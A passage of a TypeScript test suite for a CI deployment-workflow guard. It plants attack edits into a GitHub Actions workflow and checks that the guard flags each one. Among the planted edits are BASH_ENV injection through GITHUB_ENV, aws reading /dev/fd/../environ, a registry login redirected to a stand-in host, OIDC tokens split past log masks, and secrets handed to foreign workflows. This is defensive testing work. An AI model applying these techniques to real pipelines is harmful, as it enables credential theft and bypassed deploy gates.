      at('DPW-10', 'prod (The fast re-check)', ENV),
      at('DPW-10', 'prod (The fast re-check)', BINDING),
    ])
    expect(
      credentialed(
        plant(
          `          SHA: \${{ github.sha }}\n`,
          `          SHA: \${{ needs.gate.outputs.previous_prod_commit }}\n`,
          "      - name: main's own CI\n",
        ),
      ),
    ).toEqual([at('DPW-10', "prod-gate (main's own CI)", ENV)])
    expect(
      credentialed(
        plant(
          `          NONPROD_DIGEST: \${{ needs.nonprod.outputs.digest }}\n        run: |\n          set -euo pipefail\n          # history.ts`,
          `          NONPROD_DIGEST: \${{ needs.build.outputs.digest }}\n        run: |\n          set -euo pipefail\n          # history.ts`,
        ),
      ),
    ).toEqual([at('DPW-10', 'prod-gate (The prod gate)', ENV)])
    // A record job's decision reads SMOKE from its env:, held as well.
    expect(
      credentialed(
        plant(
          `          SMOKE: \${{ needs.smoke-nonprod.result }}\n`,
          `          SMOKE: \${{ needs.nonprod.result }}\n`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('DPW-10', 'record-nonprod (Write the record)', ENV)])
    // A job's outputs are its steps' as named: one swapped for another of the plan's is found.
    expect(
      credentialed(
        plant(
          `      rollback_prod: \${{ steps.plan.outputs.rollback_prod }}\n`,
          `      rollback_prod: \${{ steps.plan.outputs.rollback_nonprod }}\n`,
          job('gate'),
        ),
      ),
    ).toEqual([at('DPW-10', 'gate', 'outputs only what JOB_OUTPUTS names, each from the step it names')])
    // A step of its own can't take the id a job's outputs read: every step's id is the guard's.
    expect(
      credentialed(
        plant(
          '      - name: Plan\n        id: plan\n',
          '      - name: Forge\n        id: plan\n        run: echo\n      - name: Plan\n        id: plan0\n',
          job('gate'),
        ),
      ),
    ).toEqual([
      at(
        'DPW-10',
        'gate',
        'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved',
      ),
      at(
        'DPW-10',
        'gate (Forge)',
        "names each step's id as STEP_IDS does, so every output a job hands on is its pinned step's",
      ),
      at(
        'DPW-10',
        'gate (Plan)',
        "names each step's id as STEP_IDS does, so every output a job hands on is its pinned step's",
      ),
    ])
  }, 30_000)

  // FLOW-A1-04: the gate's outputs are its plan's; a line of its own before PLAN_CALL ends the step with
  // outputs of its own, and one after it writes a key again, which the runner reads last.
  it('pins the gate’s steps and every run that writes an output (FLOW-A1-04)', () => {
    const plan = `          ${PLAN_CALL}\n`
    for (const planted of [
      addedBefore('gate', 'Plan', plan, lines('echo "rollback_prod=true" >>"$GITHUB_OUTPUT"', 'exit 0')),
      plant(
        '          } >>"$GITHUB_STEP_SUMMARY"\n\n  # The build',
        '          } >>"$GITHUB_STEP_SUMMARY"\n          echo "rollback_prod=true" >>"$GITHUB_OUTPUT"\n\n  # The build',
      ),
    ]) {
      expect(
        gateFindings(planted, environments, PROFILES.nonprod.holdsRealData, protectEnvironments, AGENT_MARKERS),
      ).toContain(at('DPW-09', 'gate (Plan)', PINNED_09))
      expect(prodPathFindings(planted)).toContain(at('DPW-08', 'gate (Plan)', OUTPUT_PINNED))
    }
    expect(
      gateFindings(
        addedBefore('gate', 'The release, migration and restore records', '          mkdir -p', lines('exit 0')),
        environments,
        PROFILES.nonprod.holdsRealData,
        protectEnvironments,
        AGENT_MARKERS,
      ),
    ).toEqual([at('DPW-09', 'gate (The release, migration and restore records)', PINNED_09)])
    expect(
      gateFindings(
        addedBefore('gate', "main's ruleset is live", '          RULES=', lines('exit 0')),
        environments,
        PROFILES.nonprod.holdsRealData,
        protectEnvironments,
        AGENT_MARKERS,
      ),
    ).toEqual([at('DPW-09', "gate (main's ruleset is live)", PINNED_09)])
    // The same class beyond the gate: a smoke ended early, a read-back, a release or prod-gate's records
    // forged, and a step of its own writing an output.
    expect(prodPathFindings(addedBefore('smoke-nonprod', 'Smoke', "          printf '%s'", lines('exit 0')))).toEqual([
      at('DPW-08', 'smoke-nonprod (Smoke)', PINNED_08),
    ])
    // An if: that skips a pinned step passes its job as surely as an early exit 0 does.
    expect(
      prodPathFindings(
        plant('      - name: Smoke\n', `      - name: Smoke\n        if: \${{ false }}\n`, job('smoke-prod')),
      ),
    ).toEqual([at('DPW-08', 'smoke-prod (Smoke)', PINNED_08)])
    expect(
      prodPathFindings(
        plant(
          `        if: \${{ needs.gate.outputs.target == 'prod' }}\n`,
          `        if: \${{ needs.gate.outputs.target == 'nothing' }}\n`,
          job('prod'),
        ),
      ),
    ).toEqual([at('DPW-08', 'prod (Services are about to change)', PINNED_08)])
    expect(
      prodPathFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          lines(`echo 'readback={}' >>"$GITHUB_OUTPUT"`),
        ),
      ),
    ).toEqual([
      at('DPW-08', 'nonprod (Read back what runs)', PINNED_08),
      at('DPW-08', 'nonprod (Read back what runs)', OUTPUT_PINNED),
    ])
    expect(
      prodPathFindings(
        addedBefore('rollback-prod', "This run's release and the previous one", '          {\n', lines('exit 0')),
      ),
    ).toContain(at('DPW-08', "rollback-prod (This run's release and the previous one)", PINNED_08))
    expect(
      prodPathFindings(addedBefore('prod-gate', "Prod's release records", '          mkdir -p', lines('exit 0'))),
    ).toEqual([at('DPW-08', "prod-gate (Prod's release records)", PINNED_08)])
    expect(
      prodPathFindings(
        plant(
          '      - name: Deploy Services\n',
          '      - name: Go\n        run: echo "go=true" >>"$GITHUB_OUTPUT"\n      - name: Deploy Services\n',
          job('nonprod'),
        ),
      ),
    ).toEqual([at('DPW-08', 'nonprod (Go)', OUTPUT_PINNED)])
  }, 30_000)

  // YAML-A1-01 and YAML-A1-02: an env: (or with: or outputs:) written as one expression is the whole mapping
  // to GitHub (BASH_ENV, say, run by bash before the step's first line) and none to the reader.
  it('refuses an env:, with: or outputs: written as one expression (YAML-A1-01, YAML-A1-02)', () => {
    const value = `\${{ fromJSON('{"BASH_ENV":"$(touch $RUNNER_TEMP/marker)"}') }}`
    expect(
      credentialed(plant('        id: mark\n', `        id: mark\n        env: ${value}\n`, job('nonprod'))),
    ).toEqual([at('DPW-10', `nonprod (${mark})`, MAPPING)])
    expect(
      credentialed(plant('    cache-mode: none\n', `    cache-mode: none\n    env: ${value}\n`, job('record-nonprod'))),
    ).toEqual([at('DPW-10', 'record-nonprod', ENV), at('DPW-10', 'record-nonprod', MAPPING)])
    expect(
      credentialed(
        plant(
          `        with:\n          artifact-ids: \${{ needs.synth.outputs.assembly }}\n          path: \${{ runner.temp }}/assembly\n`,
          `        with: \${{ fromJSON('{"artifact-ids":"","path":"x"}') }}\n`,
          job('nonprod'),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Download the assembly)', MAPPING))
  }, 30_000)
})

describe('Round 4, attack 2: the ways past the allowlist (DPW-02, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const STEPS =
    'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved'
  const FILES =
    'names no GITHUB_ENV, GITHUB_PATH or GITHUB_STATE, in any job: no step hands a later one of its job a variable (BASH_ENV, say, which bash reads before a pinned run), a folder to search first or a state'
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads or the read-back builds one from but by the commands AWS_VALUE_LINES writes (the read-back's from AWS's answers, never a stack's outputs), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const BLOCK_SCALARS = `${DEPLOY}: DPW-02 writes a block scalar only as a run:, never as an env: entry, an output, an input or any other value, whose last line break GitHub keeps and the guard's reader drops`
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  // deploy.yml with a run step of its own, named name, before one of a job's steps.
  const stepBefore = (id: string, before: string, name: string, ...run: string[]) =>
    plant(
      `      - name: ${before}\n`,
      `      - name: ${name}\n        run: |\n${lines(...run)}      - name: ${before}\n`,
      job(id),
    )

  // YAML-A2-01: a step of its own, before a pinned run in a job that holds no credentials, writes BASH_ENV to
  // GITHUB_ENV, so bash runs a file of its own before the smoke, the gate's plan or prod-gate's read of
  // main's CI (a trap that exits 0, or writes an output again), though every line of the pinned run is as
  // written. Every job's steps are now the guard's, and no run of any job names a file command.
  it('holds every job to its own steps, none naming GITHUB_ENV, GITHUB_PATH or GITHUB_STATE (YAML-A2-01)', () => {
    const bashEnv = [
      `echo "trap 'exit 0' EXIT" >"$RUNNER_TEMP/env.sh"`,
      'echo "BASH_ENV=$RUNNER_TEMP/env.sh" >>"$GITHUB_ENV"',
    ]
    // One of each class of job: the smokes, the gates, a job that runs repository code by design, a record
    // job and a credentialed job.
    for (const [id, before] of [
      ['smoke-prod', 'Smoke'],
      ['gate', 'Plan'],
      ['prod-gate', "main's own CI"],
      ['build', 'Build the image'],
      ['record-nonprod', 'Write the record'],
      ['nonprod', 'What runs'],
    ] as const) {
      const found = credentialed(stepBefore(id, before, 'Prepare', ...bashEnv))
      expect(found, id).toContain(at('DPW-10', id, STEPS))
      expect(found, id).toContain(at('DPW-10', `${id} (Prepare)`, FILES))
    }
    // A step of its own that names no file command, and a step dropped, moved or run in place of an action.
    expect(credentialed(stepBefore('smoke-prod', 'Smoke', 'Prepare', 'echo ready'))).toEqual([
      at('DPW-10', 'smoke-prod', STEPS),
    ])
    expect(credentialed(removedStep('smoke-prod', 'Node, from .nvmrc'))).toEqual([at('DPW-10', 'smoke-prod', STEPS)])
    expect(credentialed(movedStep('prod-gate', "main's own CI", "Prod's release records"))).toEqual([
      at('DPW-10', 'prod-gate', STEPS),
    ])
    const node = stepText(deployText, 'smoke-prod', 'Node, from .nvmrc')
    expect(
      credentialed(
        withText(
          DEPLOY,
          edited(deployText, node, '      - name: Node, from .nvmrc\n        run: echo ready\n', job('smoke-prod')),
        ),
      ),
    ).toEqual([at('DPW-10', 'smoke-prod', STEPS)])
    // A file command in a step the job has, in any spelling, a comment included.
    const client = '          sudo apt-get update\n'
    for (const line of [
      'echo "$RUNNER_TEMP/bin" >>"$GITHUB_PATH"',
      `echo "BASH_ENV=$RUNNER_TEMP/env.sh" >>"\${GITHUB_ENV}"`,
      'echo "x=1" >>"$GITHUB_STATE"',
      '# GITHUB_ENV',
    ]) {
      expect(credentialed(addedBefore('build', 'The PostgreSQL client', client, lines(line))), line).toEqual([
        at('DPW-10', 'build (The PostgreSQL client)', FILES),
      ])
    }
  }, 30_000)

  // YAML-A2-02: an env: value written as a literal block scalar keeps its last line break in GitHub's reading
  // (YAML's clip chomping), which the reader drops, so TARGET reaches prod's fast re-check as prod and a
  // newline and its attempt, ancestry and digest checks are skipped, though the value equals STEP_ENVS'.
  it('refuses a block scalar on any key but run:, whose last line break GitHub keeps (YAML-A2-02)', () => {
    const block = (from: string, key: string, value: string, indicator: string, after: string) =>
      plant(
        from,
        from.replace(`${key}: ${value}`, `${key}: ${indicator}\n${' '.repeat(from.indexOf(key) + 2)}${value}`),
        after,
      )
    for (const indicator of ['|', '|+', '|-']) {
      // A step's env:, as the attack wrote it, which the env pin alone doesn't see.
      const target = `          TARGET: \${{ needs.gate.outputs.target }}\n`
      const planted = block(target, 'TARGET', `\${{ needs.gate.outputs.target }}`, indicator, job('prod'))
      expect(permissionFindings(planted), indicator).toEqual([BLOCK_SCALARS])
      expect(credentialed(planted), indicator).toEqual([])
      // A job's env:, a job's output, an action's input and a concurrency group.
      for (const [from, key, value, after] of [
        ['      STAGE: nonprod\n', 'STAGE', 'nonprod', job('nonprod')],
        [`      mode: \${{ steps.plan.outputs.mode }}\n`, 'mode', `\${{ steps.plan.outputs.mode }}`, job('gate')],
        ['          persist-credentials: false\n', 'persist-credentials', 'false', job('smoke-prod')],
        ['      group: deploy-nonprod\n', 'group', 'deploy-nonprod', job('nonprod')],
      ] as const) {
        expect(permissionFindings(block(from, key, value, indicator, after)), `${key} ${indicator}`).toContain(
          BLOCK_SCALARS,
        )
      }
    }
  })

  // FLOW-A2-01: an aws value built from a variable a run's own lines set, whole ("$CLUSTER" set to file://…)
  // or joined to a literal key (imageTag$X with X set to @=file://…), makes aws load a local file (the
  // registry login's auth file, or the environment through /dev/fd/../environ), though the guard read no
  // scheme in its literal text.
  it('builds no aws value from a variable its own lines set (FLOW-A2-01)', () => {
    const forward = 'Deploy Platform, Data and Tasks'
    const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
    const describeServices = (value: string) =>
      `STATUS=$(get aws ecs describe-services --cluster ${value} --services hearth-nonprod-api --query 'services[0].status' --output text)`
    const inForward = (...each: string[]) => credentialed(addedBefore('nonprod', forward, assembly, lines(...each)))
    for (const set of ['CLUSTER=file://$XDG_RUNTIME_DIR/containers/auth.json', 'CLUSTER=file:///dev/fd/../environ']) {
      expect(inForward(set, describeServices('"$CLUSTER"')), set).toContain(
        at('DPW-10', `nonprod (${forward})`, SETS_INPUT),
      )
    }
    expect(
      inForward(
        'X=@=file://$XDG_RUNTIME_DIR/containers/auth.json',
        `TAGS=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$DIGEST,imageTag$X" --query 'imageDetails[0].imageTags' --output json)`,
      ),
    ).toContain(at('DPW-10', `nonprod (${forward})`, HELD))
    expect(
      credentialed(
        addedBefore(
          'nonprod',
          'Deploy Services',
          assembly,
          lines(
            'TASK_ARNS=("file:///dev/fd/../environ")',
            `ENDED=$(get aws ecs describe-tasks --cluster "hearth-$STAGE" --tasks "\${TASK_ARNS[@]}" --query 'tasks[0].lastStatus' --output text)`,
          ),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Deploy Services)', SETS_INPUT))
    // Every other name an aws value reads, set on a line of its own by any setter the table admits.
    for (const set of [
      'MIGRATE_TD=x',
      'NET_MIGRATE=x',
      'TOKEN=x',
      'GROUP_ARN=x',
      'BALANCER=x',
      'DIGEST=x',
      'ROLE=x',
      'for ROLE in x; do echo "$ROLE"; done',
      'mapfile -t TASK_ARNS < <(echo x)',
    ]) {
      expect(inForward(set), set).toContain(at('DPW-10', `nonprod (${forward})`, SETS_INPUT))
    }
    // Any other word holding an expansion, even of a name the guard pins, or after a literal part.
    for (const value of ['"x-$STAGE"', `"hearth-\${STAGE}"`, '"$CLUSTER$STAGE"', '"arn:$STAGE"']) {
      expect(inForward(describeServices(value)), value).toContain(at('DPW-10', `nonprod (${forward})`, HELD))
    }
    // The workflow's own words and its token's line pass every layer but the pin, which now holds this step
    // whole too.
    const pinned = at('DPW-10', `nonprod (${forward})`, PINNED_10)
    expect(inForward(describeServices('"hearth-$STAGE"'))).toEqual([pinned])
    expect(inForward('TOKEN="probe-nonprod-deploy-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"')).toEqual([pinned])
  }, 30_000)
})

describe('Round 4, attack 3: the ways past the allowlist (DPW-02, DPW-07, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads or the read-back builds one from but by the commands AWS_VALUE_LINES writes (the read-back's from AWS's answers, never a stack's outputs), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const OWN =
    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
  const previous = '          ASSEMBLY="$RUNNER_TEMP/assembly-previous"\n'

  // COMMANDS-A3-01: an own line sets ACCOUNT_ID, which the one line allowed to set REGISTRY reads, so the
  // canonical login sends the registry password to a host of its own choosing; ACCOUNT_ID was set by a step's
  // env: in the push and the mask alone, and pinned nowhere else.
  it('lets no line of its own set the account id the registry is built from (COMMANDS-A3-01)', () => {
    const where = 'nonprod (Roll back to the target)'
    const login = lines(
      'ACCOUNT_ID=host.invalid.example/x',
      'REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"',
      'get aws ecr get-login-password --region ap-southeast-1 | skopeo login --username AWS --password-stdin "$REGISTRY" 2>&1 | mask',
    )
    expect(credentialed(addedBefore('nonprod', 'Roll back to the target', assembly, login))).toEqual([
      at('DPW-10', where, PINNED_10),
      at('DPW-10', where, SETS_INPUT),
    ])
    // Any setter the table admits, in any step, the push's own included.
    for (const set of ['ACCOUNT_ID=x', 'for ACCOUNT_ID in x; do echo "$ACCOUNT_ID"; done']) {
      expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, lines(set))), set).toContain(
        at('DPW-10', 'nonprod (Deploy Services)', SETS_INPUT),
      )
    }
    const registry = '          REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"\n'
    expect(credentialed(addedBefore('prod', 'Push the image', registry, lines('ACCOUNT_ID=x')))).toContain(
      at('DPW-10', 'prod (Push the image)', SETS_INPUT),
    )
  })

  // FLOW-A3-01: a credentialed run's own line hands jq the OIDC request token, which the runner puts in every
  // run step of a job with id-token: write, and jq prints it split or sliced, in pieces no mask matches.
  it('expands on a credentialed or record run’s own lines only the names it owns (FLOW-A3-01)', () => {
    const split = `jq -nc --arg u "$ACTIONS_ID_TOKEN_REQUEST_URL" --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '[$u, ($t | split("."))]'`
    const slice = `jq -n -r --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '$t | .[0:40], .[40:]'`
    for (const [id, name, anchor, line] of [
      ['nonprod', 'Deploy Services', assembly, split],
      ['prod', 'Take the restore stage down', assembly, slice],
      ['rollback-nonprod', 'Roll back Tasks and Services', previous, split],
      ['rollback-prod', 'Roll back Tasks and Services', previous, split],
    ] as const) {
      const planted = addedBefore(id, name, anchor, lines(line))
      expect(maskingFindings(planted), `${id} ${name}`).toEqual([at('DPW-07', `${id} (${name})`, OWN)])
      expect(credentialed(planted), `${id} ${name}`).toEqual([at('DPW-10', `${id} (${name})`, PINNED_10)])
    }
    // The URL through a name of its own, the GitHub token gh reads itself, and a record job's run.
    expect(
      maskingFindings(addedBefore('nonprod', 'Deploy Services', assembly, lines('U="$ACTIONS_ID_TOKEN_REQUEST_URL"'))),
    ).toEqual([at('DPW-07', 'nonprod (Deploy Services)', OWN)])
    const tokenSplit = `jq -nc --arg t "$GH_TOKEN" '$t | split("")'`
    expect(
      maskingFindings(
        addedBefore('nonprod', 'The fast re-check', '          newest=$(newest_release nonprod)\n', lines(tokenSplit)),
      ),
    ).toEqual([at('DPW-07', 'nonprod (The fast re-check)', OWN)])
    const url = '          URL="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"\n'
    expect(maskingFindings(addedBefore('record-prod', 'Write the record', url, lines(tokenSplit)))).toEqual([
      at('DPW-07', 'record-prod (Write the record)', OWN),
    ])
    // A job that holds neither credentials nor records is held the same way since the ninth review's fourth
    // attack (EXPAND-A4-02: the gate spaced out GH_TOKEN with sed): its job's token is a name it doesn't own.
    expect(
      maskingFindings(
        plant(
          'node infra/scripts/deploy/smoke.ts',
          `jq -n --arg t "$GITHUB_TOKEN" '$t' >/dev/null\n          node infra/scripts/deploy/smoke.ts`,
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([at('DPW-07', 'smoke-nonprod (Smoke)', OWN)])
  })

  // FLOW-A3-02, and FLOW-A3-01's class: a credentialed run's own lines capture an AWS answer and print it split,
  // past both masks. Every run of the five credentialed jobs is now pinned whole, under its own if:, so none has
  // a line of its own at all.
  it('pins every run of a job that holds the deploy role, so none has a line of its own (FLOW-A3-02)', () => {
    const account = lines(
      `ID=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Services" --query 'Stacks[0].StackId' --output text)`,
      `jq -nc --arg i "$ID" '$i | split(":")[4] | split("")'`,
    )
    expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, account))).toEqual([
      at('DPW-10', 'nonprod (Deploy Services)', PINNED_10),
    ])
    // A harmless line at the end of every run of each credentialed job is the finding of the rule that pins it.
    const finders = {
      'DPW-08': [prodPathFindings, PINNED_08],
      'DPW-10': [credentialed, PINNED_10],
      'DPW-13': [releaseFindings, PINNED_13],
    } as const
    for (const jobId of Object.keys(ENVIRONMENT_JOBS)) {
      const each = workflowJobs(deployText).find(job => job.id === jobId)
      const runs = (each === undefined ? [] : parsedSteps(each)).filter(step => step.run !== undefined)
      expect(runs.length, jobId).toBeGreaterThan(0)
      for (const { name = '' } of runs) {
        const rule = PINNED_RUNS()[jobId]?.[name]?.rule
        expect(rule, `${jobId} (${name})`).toBeDefined()
        if (rule === undefined || rule === 'DPW-09') continue
        const step = stepText(deployText, jobId, name)
        const one = /^ {8}run: (?![|>])(.*)\n/m.exec(step)
        const to =
          one === null
            ? `${step}          echo ready\n`
            : step.replace(one[0], `        run: |\n          ${one[1]}\n          echo ready\n`)
        const [finder, text] = finders[rule]
        expect(finder(withText(DEPLOY, edited(deployText, step, to, job(jobId)))), `${jobId} (${name})`).toContain(
          at(rule, `${jobId} (${name})`, text),
        )
      }
    }
    // A run step of a credentialed job that PINNED_RUNS doesn't name, and a pinned step under an if: of its own.
    const renamed = plant('      - name: Deploy Services\n', '      - name: Deploy the services\n', job('nonprod'))
    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy the services)', PINNED_10))
    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy Services)', PINNED_10))
    expect(
      credentialed(
        plant(
          `        if: \${{ needs.gate.outputs.mode == 'rollback' }}\n`,
          `        if: \${{ needs.gate.outputs.mode != 'deploy' }}\n`,
          '      - name: Roll back to the target\n',
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Roll back to the target)', PINNED_10))
  }, 60_000)

  // A run pinned under another rule no longer lets its own lines set a name an aws value reads: only the
  // commands AWS_VALUE_LINES writes may (since the ninth review's second attack, never the pinned text itself),
  // so a line added to the read-back that sets one is this rule's finding as well as its pin's.
  it('lets a pinned run’s own lines set a name an aws value reads only by the commands the guard writes', () => {
    const states = '              STATES=$(get aws elbv2 describe-target-health'
    expect(
      credentialed(
        addedBefore('nonprod', 'Read back what runs', states, '              GROUP_ARN=file:///dev/fd/../environ\n'),
      ),
    ).toContain(at('DPW-10', 'nonprod (Read back what runs)', SETS_INPUT))
  })

  // YAML-A3-01: another workflow's job calls a reusable workflow the guard never reads (another repository's,
  // or this one's at another ref) whose job names an environment or joins a deploy group, and can be handed
  // that environment's secrets.
  it('lets another workflow call only one of this repository’s at this commit, and hand it no secret (YAML-A3-01)', () => {
    const CALLS =
      'calls only another workflow of this repository at this commit (./.github/workflows/<file>.yml), never deploy.yml, one of another repository or one at another ref'
    const SECRETS = 'hands no secret to a called workflow'
    const ci = (id: string, rule: string) => `${CI}: DPW-02 ${id}: ${rule}`
    const extra = (...keys: string[]) =>
      plant('\njobs:\n', `\njobs:\n  extra:\n${keys.map(key => `    ${key}\n`).join('')}`, '', CI)
    const elsewhere =
      'uses: example-org/shared-workflows/.github/workflows/hold.yml@0123456789abcdef0123456789abcdef01234567'
    expect(permissionFindings(extra(elsewhere, 'secrets: inherit'))).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
    expect(
      permissionFindings(
        extra(
          elsewhere,
          'secrets:',
          `  ROLE: \${{ secrets.AWS_DEPLOY_ROLE }}`,
          `  ACCOUNT: \${{ secrets.AWS_ACCOUNT_ID }}`,
        ),
      ),
    ).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
    for (const uses of [
      elsewhere,
      'uses: example-org/example-repo/.github/workflows/secrets.yml@0123456789abcdef0123456789abcdef01234567',
      'uses: ./.github/workflows/missing.yml',
      'uses: ./.github/workflows/sub/secrets.yml',
      'uses: ./.github/workflows/secrets.yml@main',
      'uses: $/.github/workflows/secrets.yml',
      'uses: ./.github/workflows/deploy.yml',
    ]) {
      expect(permissionFindings(extra(uses)), uses).toEqual([ci('extra', CALLS)])
    }
    // ci.yml's own call, handed the secrets; and the same call from a job of its own, which passes.
    const own = '    uses: ./.github/workflows/secrets.yml\n'
    expect(permissionFindings(plant(own, `${own}    secrets: inherit\n`, '', CI))).toEqual([ci('secrets', SECRETS)])
    expect(permissionFindings(extra('uses: ./.github/workflows/secrets.yml'))).toEqual([])
  })
})

describe('Round 5, attack 1: the ways past the allowlist (DPW-04, DPW-07, DPW-08, DPW-12 to DPW-14)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  const synthLine = `          npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST" "\${CONTEXT[@]}" -o "$RUNNER_TEMP/assembly"\n`
  const synthStep = 'synth (Synthesise the release)'

  // EXPAND-A1-01 to A1-03, COMMANDS-A1-01 and A1-02: build's and synth's runs had lines of their own, which the
  // table and the text rules read, so env handed to a program as a word built from an expansion, the synth's
  // words quoted, npm's and the CLI's own aliases for its command and flag (run-script, synthesize, --context),
  // GITHUB_ENV's file reached through its folder, and a script's name bash joins from quoted or expanded parts
  // all passed. Every run of build and synth is now pinned whole too, so no run of deploy.yml has a line of its
  // own.
  it('pins every run of build and synth whole, so none has a line of its own (EXPAND-A1-01 to A1-03, COMMANDS-A1-01, A1-02)', () => {
    const ahead = (added: string) => addedBefore('synth', 'Synthesise the release', synthLine, added)
    const instead = (to: string) => plant(synthLine, to, job('synth'))
    for (const [what, planted] of [
      ['env by an expanded word', ahead(lines('E=en', `xargs "\${E}v" </dev/null`))],
      ['env by a quoted split', ahead(lines('E=e""nv', 'xargs "$E" </dev/null'))],
      ['printenv by an expanded word', ahead(lines('P=print', `xargs "\${P}env" </dev/null`))],
      ['env through find', ahead(lines('E=en', `find /dev/null -maxdepth 0 -exec "\${E}v" ';'`))],
      [
        'the step file by its folder',
        ahead(
          lines(
            `echo 'exit 0' >"$RUNNER_TEMP/bash-env"`,
            `FILE=$(find "$RUNNER_TEMP/_runner_file_commands" -name 'set_env_*')`,
            'echo "BASH_ENV=$RUNNER_TEMP/bash-env" >>"$FILE"',
          ),
        ),
      ],
      [
        'quoted words',
        instead(
          lines(
            'npm run "synth" -w @hearth/infra -- -c "release=$COMMIT:$DIGEST" -c "drill=break:nonprod" -o "$RUNNER_TEMP/assembly"',
          ),
        ),
      ],
      ['synth:ci quoted', instead(lines('npm run "synth":ci -w @hearth/infra -- -o "$RUNNER_TEMP/assembly"'))],
      [
        'run-script and --context',
        instead(
          lines(
            'npm run-script synth -w @hearth/infra -- --context release="$COMMIT:$DIGEST" --context drill=break:nonprod -o "$RUNNER_TEMP/assembly"',
          ),
        ),
      ],
      [
        'cdk synthesize',
        instead(
          lines(
            `npx -w @hearth/infra cdk synthesize --app 'node bin/workload.ts' --context release="$COMMIT:$DIGEST" --context drill=break:nonprod -o "$RUNNER_TEMP/assembly"`,
          ),
        ),
      ],
    ] as const) {
      expect(releaseFindings(planted), what).toContain(at('DPW-13', synthStep, PINNED_13))
    }
    const check = '          IMAGE=hearth-server:build scripts/check-server.sh\n'
    for (const added of [
      lines('node scripts/owner-"bootstrap".ts set-up --database hearth'),
      lines('B=bootstrap', 'node "scripts/owner-$B.ts" set-up --database hearth'),
    ]) {
      expect(releaseFindings(addedBefore('build', 'Check the image', check, added)), added).toContain(
        at('DPW-13', 'build (Check the image)', PINNED_13),
      )
    }
    // Each synth step's folder is pinned with its run: the release's synth run in another checkout's folder.
    expect(
      releaseFindings(
        plant(
          '        working-directory: release\n        env:\n',
          '        working-directory: previous-nonprod\n        env:\n',
          job('synth'),
        ),
      ),
    ).toContain(at('DPW-13', synthStep, PINNED_13))
  })

  // The same class beyond build and synth: the gate's read of its pull request's checks and prod-gate's wait
  // for main's CI and its call were held by run, not by their if:, so a step skipped under an if: of its own
  // passed. Every run of every job is now one PINNED_RUNS pins whole, under its own if: and in its own folder.
  it('pins every run of deploy.yml whole, under its own if:, so none has a line of its own', () => {
    const finders = {
      'DPW-08': [prodPathFindings, PINNED_08],
      'DPW-09': [
        (planted: ReadonlyMap<string, string>) =>
          gateFindings(planted, environments, PROFILES.nonprod.holdsRealData, protectEnvironments, AGENT_MARKERS),
        PINNED_09,
      ],
      'DPW-10': [
        (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile),
        PINNED_10,
      ],
      'DPW-13': [releaseFindings, PINNED_13],
    } as const
    for (const each of workflowJobs(deployText)) {
      for (const { name = '' } of parsedSteps(each).filter(step => step.run !== undefined)) {
        const rule = PINNED_RUNS()[each.id]?.[name]?.rule
        expect(rule, `${each.id} (${name})`).toBeDefined()
        if (rule === undefined) continue
        const step = stepText(deployText, each.id, name)
        const one = /^ {8}run: (?![|>])(.*)\n/m.exec(step)
        const to =
          one === null
            ? `${step}          echo ready\n`
            : step.replace(one[0], `        run: |\n          ${one[1]}\n          echo ready\n`)
        const [finder, text] = finders[rule]
        expect(finder(withText(DEPLOY, edited(deployText, step, to, job(each.id)))), `${each.id} (${name})`).toContain(
          at(rule, `${each.id} (${name})`, text),
        )
      }
    }
    // A step skipped under an if: of its own, and one whose if: is gone.
    const pull = '      - name: The pull request that made this commit, and its checks\n'
    expect(prodPathFindings(plant(pull, `${pull}        if: \${{ false }}\n`, job('gate')))).toContain(
      at('DPW-08', 'gate (The pull request that made this commit, and its checks)', PINNED_08),
    )
    const prodGate = '      - name: The prod gate\n'
